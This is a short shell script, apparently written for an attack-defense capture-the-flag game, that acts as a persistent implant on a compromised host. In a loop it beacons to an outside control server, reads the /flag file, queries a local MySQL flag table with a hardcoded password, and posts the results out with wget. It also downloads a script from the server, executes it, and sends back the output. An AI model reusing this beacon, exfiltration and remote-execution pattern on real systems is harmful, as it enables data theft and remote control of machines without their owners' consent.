#!/bin/sh

flag_server="ncc-control.scalecom.ga:8087"
flag_server="http://$flag_server"

host=$(hostname | cut -d'_' -f2)

# for i in $(seq 2); do
while true; do
    wget "$flag_server/?src=$host" -qO-

    flag1=$(cat /flag)
    wget "$flag_server/?src=$host&tag=wwwphp:flag1" -qO- --post-data="$flag1"
    echo "$flag1"
    flag2=$(mysql -h127.0.0.1 -uschtar --password=2021330#schtar sport -e 'select * from flagTbl;' | grep '{')
    wget "$flag_server/?src=$host&tag=wwwphp:flag2" -qO- --post-data="$flag2"
    echo "$flag2"

    wget "$flag_server/cmd.php" -O /tmp/exec.sh
    result=$(sh /tmp/exec.sh 2>&1 | head -c 1024)

    if [ ! -z "$result" ]; then
        wget "$flag_server/?src=$host&tag=command" -qO- --post-data="$result"
    fi

    sleep $(shuf -i 100-300 -n1)
done
